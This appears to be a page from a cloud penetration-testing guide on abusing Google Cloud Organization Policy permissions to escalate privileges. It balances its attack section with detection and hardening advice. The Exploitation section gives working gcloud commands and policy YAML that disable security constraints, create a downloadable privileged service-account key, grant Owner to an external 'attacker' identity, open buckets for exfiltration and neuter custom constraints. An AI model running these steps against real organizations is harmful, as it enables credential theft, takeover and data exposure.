---
cstg_id: CSTG-GCP-ORG-POLICY-PRIVESC
title: "GCP Org Policy - Privilege Escalation"
provider: gcp
service: org-policy
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - orgpolicy.policy.set
  - orgpolicy.constraints.list
  - orgpolicy.customConstraints.create
  - orgpolicy.customConstraints.update
  - orgpolicy.customConstraints.delete
  - resourcemanager.organizations.setIamPolicy
tools:
  - gcloud CLI
  - Org Policy API (orgpolicy.googleapis.com)
  - Resource Manager API
references:
  - https://cloud.google.com/resource-manager/docs/organization-policy/overview
  - https://cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints
  - https://cloud.google.com/resource-manager/docs/organization-policy/restricting-service-accounts
  - https://cloud.google.com/iam/docs/understanding-roles#orgpolicy-roles
  - https://cloud.google.com/sdk/gcloud/reference/org-policies/set-policy
  - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
  - https://hackingthe.cloud/gcp/
license: CC BY-SA 4.0
---

## Summary

Organization Policy is a **preventive control plane**: many of the guardrails that block privilege escalation, lateral movement, and data exfiltration in Google Cloud are implemented as org-policy constraints rather than IAM. As a result, the *ability to modify org policy* is itself a powerful privilege: it does not directly grant IAM roles, but it can **remove the controls that would otherwise stop a separate escalation step**, or **enable a capability** that another technique depends on.

The pivotal permission is `orgpolicy.policy.set` (held by `roles/orgpolicy.policyAdmin`). A principal with this permission at any hierarchy node can relax or disable enforced constraints for that node and its descendants. Because constraints are inherited and merged, an attacker who controls policy at a high node (organization or folder) can weaken protections for many projects at once.

This page enumerates how control over org policy is abused as an escalation *enabler*, the relationship between org-policy admin and IAM admin, and how custom constraints can be neutralized. It assumes the assessor already holds — or can reach — `orgpolicy.policy.set` or an equivalent custom role, having identified the policy posture via [GCP Org Policy - Enumeration](../02-services/gcp-org-policy-enum.md).

## Prerequisites

- An assumed-breach principal that holds, directly or transitively, one of:
  - `roles/orgpolicy.policyAdmin` (grants `orgpolicy.policy.set`, `orgpolicy.policy.get`, custom-constraint CRUD), or
  - a custom role containing `orgpolicy.policy.set` (and optionally `orgpolicy.customConstraints.*`), at an organization, folder, or project node.
- A target node in the hierarchy where the constraint to be weakened is enforced (or inherited).
- For chained escalation, the secondary permission needed by the downstream technique (e.g., `iam.serviceAccountKeys.create`, `iam.serviceAccounts.actAs`, `resourcemanager.projects.setIamPolicy`). Org-policy modification *unblocks* these; it does not replace them.

> Important distinction: `orgpolicy.policy.set` does **not** grant IAM roles by itself. It changes what configurations are *permitted*. Escalation arises by chaining a policy relaxation with a second action the relaxation now allows.

## Enumeration

Confirm both the policies you can change and the policies currently blocking your downstream technique:

```bash
# Can the current principal set policy on the target node?
gcloud org-policies list --organization=ORG_ID            # requires read
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions=orgpolicy.policy.set,orgpolicy.policy.get

# What is the effective enforcement of the blocking constraint?
gcloud org-policies describe constraints/iam.disableServiceAccountKeyCreation \
  --project=PROJECT_ID --effective
```

## Misconfigurations & Findings

- **`orgpolicy.policyAdmin` granted broadly.** The role bundled into a custom "admin" role or assigned at the org to non-platform identities (CI/CD service accounts, contractors) lets the holder disable any enforced guardrail.
- **Org-policy admin separated from IAM admin in name only.** Organizations sometimes treat policy admin as "low risk" because it grants no roles. In practice it removes the barriers that justify the rest of the control set, so it should be governed with the same rigor as IAM admin.
- **Custom constraints owned by the same principals they restrict.** If a custom constraint enforces a security control but the workload it governs can also `update`/`delete` that custom constraint, the control is self-defeating.
- **No dry-run / change review on policy edits.** Policy changes can take effect immediately and propagate down the hierarchy; absence of change control means a single API call silently lowers protection org-wide.

## Exploitation

Each subsection is keyed to the permission/role being abused and shows the policy change followed by the escalation it unblocks.

### orgpolicy.policy.set — disable `iam.disableServiceAccountKeyCreation`

If service-account key creation is the only thing blocking persistence/credential theft, relax the constraint, then mint a long-lived key for a privileged service account:

```bash
# 1. Disable the boolean constraint on the target node
cat > /tmp/policy.yaml <<'EOF'
name: projects/PROJECT_ID/policies/iam.disableServiceAccountKeyCreation
spec:
  rules:
    - enforce: false
EOF
gcloud org-policies set-policy /tmp/policy.yaml

# 2. Now permitted: create a downloadable key for a privileged SA (requires iam.serviceAccountKeys.create)
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account=privileged-sa@PROJECT_ID.iam.gserviceaccount.com
```

The exfiltrated JSON key is a portable, long-lived credential usable from outside the environment.

### orgpolicy.policy.set — disable `iam.automaticIamGrantsForDefaultServiceAccounts`

This constraint, when enforced, stops default Compute/App Engine service accounts from receiving `roles/editor`. Disabling it (then creating a new project, or relying on default-SA behavior) yields an Editor-privileged default SA that compute workloads can `actAs`:

```bash
cat > /tmp/policy.yaml <<'EOF'
name: organizations/ORG_ID/policies/iam.automaticIamGrantsForDefaultServiceAccounts
spec:
  rules:
    - enforce: false
EOF
gcloud org-policies set-policy /tmp/policy.yaml
# Subsequently provisioned default SAs receive roles/editor -> compute->SA impersonation pivot
```

### orgpolicy.policy.set — weaken `iam.allowedPolicyMemberDomains`

This list constraint restricts which identity domains can appear in IAM bindings. Relaxing it to `allowAll` permits granting access to `allUsers`, `allAuthenticatedUsers`, or attacker-controlled external Google identities — enabling cross-tenant access and public data exposure:

```bash
cat > /tmp/policy.yaml <<'EOF'
name: organizations/ORG_ID/policies/iam.allowedPolicyMemberDomains
spec:
  rules:
    - allowAll: true
EOF
gcloud org-policies set-policy /tmp/policy.yaml

# Now permitted: grant a role to an external/attacker identity or to allUsers
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@external.example" --role="roles/owner"
```

### orgpolicy.policy.set — relax `compute.*` hardening to enable compute-based escalation

Disabling compute guardrails opens paths used by compute-to-credential techniques:

```bash
# Allow external IPs (constraint is a list type)
cat > /tmp/policy.yaml <<'EOF'
name: projects/PROJECT_ID/policies/compute.vmExternalIpAccess
spec:
  rules:
    - allowAll: true
EOF
gcloud org-policies set-policy /tmp/policy.yaml

# Disable Shielded VM / OS Login / serial-port enforcement similarly (boolean enforce:false),
# enabling startup-script abuse, serial-console access, or metadata-credential theft on VMs
# that run a privileged service account.
```

Combined with `iam.serviceAccounts.actAs` over a privileged service account, an attacker can create a VM bound to that SA and harvest its tokens from the metadata server — a path the disabled constraints were preventing.

### orgpolicy.policy.set — relax `storage.publicAccessPrevention` / `storage.uniformBucketLevelAccess`

Disabling these enables data exfiltration via public buckets or legacy object ACLs:

```bash
cat > /tmp/policy.yaml <<'EOF'
name: projects/PROJECT_ID/policies/storage.publicAccessPrevention
spec:
  rules:
    - enforce: false
EOF
gcloud org-policies set-policy /tmp/policy.yaml
# Then a bucket can be made public (allUsers reader) to stage exfiltration.
```

### orgpolicy.customConstraints.update / delete — neutralize custom guardrails

Custom constraints implement bespoke CEL-based controls. A principal with `orgpolicy.customConstraints.update`/`delete` can rewrite the CEL condition to always pass, change `actionType` from `DENY` to `ALLOW`, narrow the `methodTypes`/`resourceTypes` so the control no longer fires, or delete the constraint outright:

```bash
# Inspect, then rewrite a custom constraint to be a no-op
gcloud org-policies describe-custom-constraint \
  organizations/ORG_ID/customConstraints/custom.requireFooLabel

cat > /tmp/cc.yaml <<'EOF'
name: organizations/ORG_ID/customConstraints/custom.requireFooLabel
resourceTypes: [compute.googleapis.com/Instance]
methodTypes: [CREATE]
condition: "true"      # was a restrictive expression; now always satisfied
actionType: ALLOW
displayName: requireFooLabel
EOF
gcloud org-policies set-custom-constraint /tmp/cc.yaml
```

### Chaining note

In all cases the org-policy change is the *enabler*; the realized privilege gain comes from the follow-on action (key creation, IAM binding, VM creation + actAs, public bucket). When the assessor also holds `orgpolicy.policy.set` at a **folder or organization** node, a single relaxation propagates to every descendant project, multiplying impact.

## Detection & Logging

- All org-policy writes are recorded in **Cloud Audit Logs** Admin Activity logs (always on) for `orgpolicy.googleapis.com`. Key `methodName` values:
  - `google.cloud.orgpolicy.v2.OrgPolicy.UpdatePolicy` / `CreatePolicy` / `DeletePolicy`
  - `google.cloud.orgpolicy.v2.OrgPolicy.CreateCustomConstraint` / `UpdateCustomConstraint` / `DeleteCustomConstraint`
- High-signal alerts: any change that sets `enforce: false` on a security boolean constraint, sets `allowAll: true` on `iam.allowedPolicyMemberDomains` or `compute.vmExternalIpAccess`, or modifies/deletes a custom constraint. These events should be correlated with the *follow-on* action (e.g., a `CreateServiceAccountKey` or `SetIamPolicy` shortly after a policy relaxation on the same node).
- Because org-policy changes inherit downward, alert on writes at organization and folder scope with elevated severity.
- The downstream actions remain independently logged (e.g., `google.iam.admin.v1.CreateServiceAccountKey`, `SetIamPolicy`, `compute.instances.insert`), enabling reconstruction of the full chain.

## Remediation & Hardening

- Treat `orgpolicy.policy.set` / `roles/orgpolicy.policyAdmin` as a **tier-0 privilege**: grant only to a minimal, audited set of platform administrators, never to workload or CI/CD service accounts.
- Separate the ability to *administer custom constraints* from the workloads those constraints govern; do not let a principal both be subject to and able to edit the same constraint.
- Apply security-critical constraints at the **organization** node and protect that node's IAM with strong controls (e.g., privileged-access management, just-in-time elevation, approval workflows).
- Enable Data Access audit logs for `orgpolicy.googleapis.com`, and build detections for `enforce:false`/`allowAll:true` transitions on security constraints and for custom-constraint deletion.
- Use **dry-run org policies** and change review for policy edits in sensitive environments so relaxations are surfaced before taking effect.
- Periodically reconcile effective policy against baseline (see Enumeration page) to detect silent downgrades and child-node overrides.

## Tools

- **gcloud CLI** — `gcloud org-policies set-policy`, `set-custom-constraint`, `delete-policy`, `describe ... --effective`.
- **Org Policy API v2** (`orgpolicy.googleapis.com`) — `UpdatePolicy`, `CreateCustomConstraint`, etc.
- **Resource Manager API** — locate target hierarchy nodes and verify inheritance scope.

## References

- Organization Policy Service overview — https://cloud.google.com/resource-manager/docs/organization-policy/overview
- Organization policy constraints catalog — https://cloud.google.com/resource-manager/docs/organization-policy/org-policy-constraints
- Restricting service accounts with org policy — https://cloud.google.com/resource-manager/docs/organization-policy/restricting-service-accounts
- Org Policy IAM roles — https://cloud.google.com/iam/docs/understanding-roles#orgpolicy-roles
- `gcloud org-policies set-policy` reference — https://cloud.google.com/sdk/gcloud/reference/org-policies/set-policy
- Rhino Security Labs — GCP privilege escalation — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Hacking the Cloud — GCP — https://hackingthe.cloud/gcp/
